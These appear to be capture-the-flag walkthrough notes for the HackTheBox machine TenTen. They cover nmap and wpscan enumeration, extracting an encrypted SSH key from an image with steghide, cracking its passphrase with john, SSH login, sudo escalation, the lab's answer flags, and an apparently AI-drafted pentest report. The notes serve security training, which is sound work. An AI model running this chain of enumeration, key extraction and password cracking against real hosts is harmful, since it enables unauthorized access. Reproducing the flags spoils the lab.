My notes from completing this box 

[TenTenNotes.pdf](https://github.com/ilyh4d3s/TenTenHTB/files/14633388/TenTenNotes.pdf)


nmap:
			sudo nmap -vvv -sVC -Pn -T4 -p0-65535 10.10.10.10 
   
				RESULTS:  Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
		Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-08 23:45 CST
		NSE: Loaded 156 scripts for scanning.
		NSE: Script Pre-scanning.
		NSE: Starting runlevel 1 (of 3) scan.
		Initiating NSE at 23:45
		Completed NSE at 23:45, 0.00s elapsed
		NSE: Starting runlevel 2 (of 3) scan.
		Initiating NSE at 23:45
		Completed NSE at 23:45, 0.00s elapsed
		NSE: Starting runlevel 3 (of 3) scan.
		Initiating NSE at 23:45
		Completed NSE at 23:45, 0.00s elapsed
		Initiating Parallel DNS resolution of 1 host. at 23:45
		Completed Parallel DNS resolution of 1 host. at 23:45, 13.01s elapsed
		DNS resolution of 1 IPs took 13.01s. Mode: Async [#: 1, OK: 0, NX: 0, DR: 1, SF: 0, TR: 3, CN: 0]
		Initiating SYN Stealth Scan at 23:45
		Scanning 10.10.10.10 [65536 ports]
		Discovered open port 80/tcp on 10.10.10.10
		Discovered open port 22/tcp on 10.10.10.10
		SYN Stealth Scan Timing: About 7.12% done; ETC: 23:53 (0:06:44 remaining)
		SYN Stealth Scan Timing: About 16.21% done; ETC: 23:52 (0:05:15 remaining)
		SYN Stealth Scan Timing: About 34.34% done; ETC: 23:50 (0:02:54 remaining)
		SYN Stealth Scan Timing: About 45.72% done; ETC: 23:50 (0:02:38 remaining)
		Stats: 0:02:50 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
		SYN Stealth Scan Timing: About 58.00% done; ETC: 23:50 (0:01:54 remaining)
		SYN Stealth Scan Timing: About 73.23% done; ETC: 23:50 (0:01:08 remaining)
		SYN Stealth Scan Timing: About 83.10% done; ETC: 23:50 (0:00:44 remaining)
		Completed SYN Stealth Scan at 23:50, 268.22s elapsed (65536 total ports)
		Initiating Service scan at 23:50
		Scanning 2 services on 10.10.10.10
		Stats: 0:04:48 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
		Service scan Timing: About 50.00% done; ETC: 23:50 (0:00:07 remaining)
		Completed Service scan at 23:50, 6.44s elapsed (2 services on 1 host)
		NSE: Script scanning 10.10.10.10.
		NSE: Starting runlevel 1 (of 3) scan.
		Initiating NSE at 23:50
		Completed NSE at 23:50, 5.26s elapsed
		NSE: Starting runlevel 2 (of 3) scan.
		Initiating NSE at 23:50
		Completed NSE at 23:50, 0.77s elapsed
		NSE: Starting runlevel 3 (of 3) scan.
		Initiating NSE at 23:50
		Completed NSE at 23:50, 0.00s elapsed
		Nmap scan report for 10.10.10.10
		Host is up, received user-set (0.14s latency).
		Scanned at 2024-03-08 23:45:51 CST for 281s
		Not shown: 65534 filtered tcp ports (no-response)
		PORT   STATE SERVICE REASON         VERSION
		22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
		| ssh-hostkey: 
		|   2048 ec:f7:9d:38:0c:47:6f:f0:13:0f:b9:3b:d4:d6:e3:11 (RSA)
		| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD0ZxDYLkSx3+n8qOc+tpjAd+KZ8STcHdayXH5Vn7gRhiI6toUP53yvS4ysmU4uq/QkX+oAJabm3H2WdVDySKvLVitCstPErNjKmi3Zr4ROlJVyv25eR0Wuo42PqDRCB0DN5SBZsoylDM1FN53ZTdiTC4Da4NM/3zfXzJgBpo8NdRyCZJnTufOdR8x4RE/0QU6UZR1cJPKKNmS/7qzHtMDZx5MM0li07d77mDpUoMCxPGCWlH5VsgpKBUSvdzd5xjilN5/tU/uwgL4FLTcMJF6DPDORYxJWjGO8ThSm8nf+kgxdv1iSF3olv++tReoWjVZy/xrEIdgHTcPjGggldR9v
		|   256 cc:fe:2d:e2:7f:ef:4d:41:ae:39:0e:91:ed:7e:9d:e7 (ECDSA)
		| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBERpTI9NMPamS6NaoLL5Y/nq+T19q1KR6GgtbsnmjCTtnGBKlaGI46uCPIYZwQ0MFDRg1hxq13rhLxl7JPIEjWU=
		|   256 8d:b5:83:18:c0:7c:5d:3d:38:df:4b:e1:a4:82:8a:07 (ED25519)
		|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIOrtl+D1cRlO2WrvblMacn5J5/rh+PTJmgxDwkBBfg7
		80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18
		| http-methods: 
		|_  Supported Methods: GET HEAD POST OPTIONS
		|_http-server-header: Apache/2.4.18 (Ubuntu)
		|_http-title: Did not follow redirect to http://tenten.htb/
		Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

		NSE: Script Post-scanning.
		NSE: Starting runlevel 1 (of 3) scan.
		Initiating NSE at 23:50
		Completed NSE at 23:50, 0.00s elapsed
		NSE: Starting runlevel 2 (of 3) scan.
		Initiating NSE at 23:50
		Completed NSE at 23:50, 0.00s elapsed
		NSE: Starting runlevel 3 (of 3) scan.
		Initiating NSE at 23:50
		Completed NSE at 23:50, 0.00s elapsed
		Read data files from: /usr/bin/../share/nmap
		Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
		Nmap done: 1 IP address (1 host up) scanned in 295.13 seconds

WordPress enumeration: 
	command: 
		sudo wpscan --url http://10.10.10.10 --enumerate u 
	Users Found: takis 

WordPress:
	///notice on the wordpress site youre able to navigate the rest of the website and view other applications by changing the # in the url:http://tenten.htb/index.php/jobs/apply/13/
	/// we know that WP stores all uploaded content  in /wp-content/uploads
	/// notice that when we change the # in the URL to 13 we see a "HackerAccessGranted" application 
	///navigate to the following URL: http://tenten.htb/wp-content/uploads/2017/04/HackerAccessGranted.jpg > save image to kali  

Steghide: 
	///trying to find any hidden information embedded in the image
		command: steghide extract -sf HackerAccessGranted.jpg      
			![[tentenHTB.png]]
	///notice that id_rsa is now on our kaliVM 
	///view the contents
		command: less id_rsa 
	///notice it is encrypted so well need to change the format into a hash that JohnTheRipper can crack
	
JohnTheRipper:
		command:  /usr/share/john/ssh2john.py id_rsa >id_rsa.login
	///now that we have the hash we need to run john to see if we can crack the password
			command:  /usr/sbin/john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.login
			///had to make sure wordlists was installed and unzipped
				command: sudo apt install wordlists           
				command: sudo gunzip /usr/share/wordlists/rockyou.txt.gz
				
			![[tenten1.png]]
			///We cracked the password and can see that it is "superpassword"
			/// Now we need to try to login to ssh using the username we found "takis" and the cracked password "superpassword"

SSH:
	command:  ssh -i id_rsa takis@10.10.10.10
		///if the command is not working you may need to  change the id_rsa file permissions
			command:  sudo chmod 600 id_rsa    
		///Enter the cracked password  & you're in HackerAccessGranted!! cat ![[tentenssh.png]]

PrivEsc: 
	sudo -l
		///see that a directory does not need a password  ![[tentenPriv.png]]
		///See that were root and now you can look around for the other flag!!

Flags: 
	User: ddcc806a63fdd7792ff886b26648cdaf
	Root: f6e949cb495eec767a1ec62e93827aeb

Post Pentest Report: 
			  
	Based on your notes, here's a draft for a professional and understandable post-penetration testing report for HackTheBox's host `10.10.10.10`.

	---

	# Penetration Testing Report for HackTheBox

	## Executive Summary

	This report documents the findings of a penetration test conducted against the host `10.10.10.10`, belonging to HackTheBox. The objective of this test was to identify vulnerabilities, assess the impact and risk of these vulnerabilities, and recommend actions to mitigate identified security issues.

	## Test Methodology

	The penetration test was conducted using a comprehensive approach, utilizing various tools and techniques to discover and exploit vulnerabilities. Key phases included:

	- **Network Scanning**: Using `nmap` for identifying open ports and services.
	- **Application Enumeration**: Specifically targeting WordPress installations to identify users and potential vulnerabilities.
	- **Content Discovery**: Exploring application behavior to discover hidden or sensitive information.
	- **Cryptanalysis**: Employing `steghide` and `JohnTheRipper` to uncover and crack encrypted data.
	- **Access Exploitation**: Utilizing discovered credentials to gain unauthorized access via SSH.
	- **Privilege Escalation**: Analyzing system configurations to escalate privileges.

	## Key Findings

	### 1. Open Ports and Services

	- **SSH (22/tcp)**: Running OpenSSH 7.2p2 Ubuntu 4ubuntu2.1.
	- **HTTP (80/tcp)**: Hosting an Apache httpd 2.4.18 server, redirecting to a WordPress site.

	### 2. WordPress Enumeration

	- A user named `takis` was discovered, indicating a potential vector for further attacks.

	### 3. Sensitive Data Exposure

	- A hidden application named "HackerAccessGranted" was found, containing an encrypted SSH private key.

	### 4. Cryptanalysis

	- The encrypted SSH private key was successfully decrypted using `JohnTheRipper`, revealing the password "superpassword".

	### 5. Unauthorized Access

	- Utilizing the decrypted SSH key and discovered password, unauthorized access was gained to the system as the user `takis`.

	### 6. Privilege Escalation

	- A misconfigured directory allowed executing commands as root without a password, leading to full system compromise.

	## Risk Assessment

	The discovered vulnerabilities pose a severe risk, potentially allowing an attacker to gain unauthorized access, escalate privileges to root, and compromise the entire system.

	## Recommendations

	1. **Update and Patch**: Ensure the operating system and all applications, especially the SSH and Apache services, are up-to-date with the latest security patches.
	2. **Password Policy**: Implement a strong password policy to prevent the use of weak passwords.
	3. **Encrypt Sensitive Data**: Use strong encryption for sensitive data and secure the decryption keys.
	4. **Regular Security Audits**: Conduct regular security audits and penetration tests to identify and mitigate new vulnerabilities.
	5. **Access Controls**: Review and tighten file and directory permissions to adhere to the principle of least privilege.

	## Conclusion

	The penetration test revealed several significant vulnerabilities within the host `10.10.10.10` that could potentially be exploited to gain unauthorized access and escalate privileges. Immediate action is recommended to address these issues and protect the system from potential threats. Regular security assessments are advised to maintain a robust security posture.
